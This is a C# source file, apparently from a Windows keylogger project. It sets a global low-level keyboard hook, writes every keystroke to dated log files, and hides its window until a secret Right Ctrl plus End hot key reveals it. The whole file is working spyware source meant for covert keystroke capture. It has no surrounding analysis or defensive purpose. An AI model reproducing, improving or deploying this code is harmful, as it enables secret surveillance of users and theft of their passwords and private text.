using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static key.API;

namespace key
{
    public class KeyBoard
    {
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                CheckHotKey(vkCode);

                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            //string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;\
            API.CreateFolderText();
            string logNameToWrite = API.FolderText + "/" + API.logName + DateTime.Now.ToLongDateString() + API.logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        public static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        static bool isHotKey = false;
        static bool isShowing = false;
        static Keys previoursKey = Keys.Separator;
        static void CheckHotKey(int vkCode)
        {
            if (previoursKey == Keys.RControlKey && (Keys)vkCode == Keys.End)
            {
                isHotKey = true;
            }

            if (isHotKey)
            {
                if (!isShowing)
                {
                    HideKeyWindow.DisplayWindow();
                }

                else
                {
                    HideKeyWindow.HideWindow();

                }
                isShowing = !isShowing;
            }
            previoursKey = (Keys)vkCode;
            isHotKey = false;
        }
    }
}
